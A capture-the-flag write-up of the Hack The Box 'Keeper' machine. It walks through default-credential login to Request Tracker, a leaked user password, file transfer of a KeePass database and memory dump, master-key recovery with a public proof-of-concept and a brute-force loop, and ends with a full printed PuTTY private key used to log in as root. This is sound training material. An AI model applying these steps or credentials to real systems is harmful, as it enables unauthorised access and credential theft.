# **Keeper | HTB**

***

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/21999f4f-3cc7-4bc1-9253-fd894cb3b7cf)

***

Running our nmap scan we have 2 open ports which are 22/SSH and 80/HTTP


```bash
# Nmap 7.94SVN scan initiated Thu Feb  8 06:57:52 2024 as: nmap -p- -sCV -v --min-rate=1000 -T4 -oN nmap.txt 10.10.11.227
Increasing send delay for 10.10.11.227 from 0 to 5 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.11.227 from 5 to 10 due to 116 out of 289 dropped probes since last increase.
Warning: 10.10.11.227 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.227
Host is up (0.17s latency).
Not shown: 58541 closed tcp ports (conn-refused), 6992 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  8 07:00:42 2024 -- 1 IP address (1 host up) scanned in 170.03 seconds
```



Navigating to port 80/HTTP we can see that we advised to redirect to [tickets.keeper.htb/rt/](http://tickets.keeper.htb/rt/)



![](https://i.imgur.com/IERhxF8.png)



Go ahead and add both `tickets.keeper.htb` and `keeper.htb` to your `/etc/hosts` file



![](https://i.imgur.com/Q2hwLpq.png)



Clicking on the link you should be redirected to this page



![](https://i.imgur.com/fbZCgwG.png)



After few enumeration i decided to search for the keyword "**RT 4.4.4 default credentials**" on google and came up with `root:password` creds


![](https://i.imgur.com/nFRjj5Z.png)



Trying this out on the web page gave us access, whoop :)


![](https://i.imgur.com/l9GOIau.png)



Navigating to `http://tickets.keeper.htb/rt/Admin/Users/` i found another user called "**lnorgaard**"


![](https://i.imgur.com/PsSOGX8.png)



Clicking the username of "**lnorgaard**", looks like we found the users password, `lnorgaard:Welcome2023!`



![](https://i.imgur.com/A9qoLjh.png)



Found out that this cred we got can login via SSH 


![](https://i.imgur.com/QEcaczU.png)


Running `ls` in our user home directory we have `.zip` file, you can go ahead and unzip it, in which gives us 2 other KeePass filess



![](https://i.imgur.com/rY07FyF.png)


Go ahead and transfer both files to our attacker's machine

```bash
# Target
python3 -m http.server 1337

# Attacker
wget 10.10.11.227:1337/passcodes.kdbx
wget 10.10.11.227:1337/KeePassDumpFull.dmp
```



![](https://i.imgur.com/LANCqPy.png)


After few attempts, trying to crack the `.kdbx` file and nothing comes up, i decided to copy the `KeePassDumpFull.dmp` file and paste on google which gave me this [link](https://github.com/matro7sh/keepass-dump-masterkey)


```bash
git clone https://github.com/matro7sh/keepass-dump-masterkey.git

cd keepass-dump-masterkey

python3 poc.py <PathToDmp>
```



Sometimes, the above might not work so use this simple `.sh` script, Note that > This script works very well in the case of a physical machine, for virtual machines it does not seem stable




```bash
#!/bin/sh
# Usage: ./keepass-pwn.sh Database.kdbx wordlist.txt (wordlist with 2 char)
while read i
do
    echo "Using password: \"$i\""
    echo "$i" | kpcli --kdb=$1 && exit 0
done < $2
```


![](https://i.imgur.com/kicyADZ.png)



Running the `poc.py` script create a listener then opening the `passcodes.kdbx` dump some gibberish text in the `poc.py` process, i then decided to copy few of the text and here is what google gave me -:


![](https://i.imgur.com/r8Zo01Z.png)


Copying this and pasting it, gives us access to the dashboard (all lowercase)



![](https://i.imgur.com/n7O1gcO.png)


Unfortunately for us, the root password doesn't work 🤣, so let focus on the certificates given, go ahead and save this file into a file called `id_rsa.ppk` 


```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```


![](https://i.imgur.com/vBLv3lM.png)



Now split the public key away from the file with the following command


```bash
puttygen id_rsa.ppk -O public-openssh -o id_rsa.pub
```



![](https://i.imgur.com/shqpcRE.png)




Do this also for the private key


```bash
puttygen id_rsa.ppk -O private-openssh -o id_rsa
```



![](https://i.imgur.com/qkHx1Kt.png)



You should then be able to login as root



![](https://i.imgur.com/ZFaCFrC.png)


Incase i am a little bit too nerdy, well This [blog](https://www.baeldung.com/linux/ssh-key-types-convert-ppk) explains how you can split the private and public key better 🤓, Have fun

GG 🎺

<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>

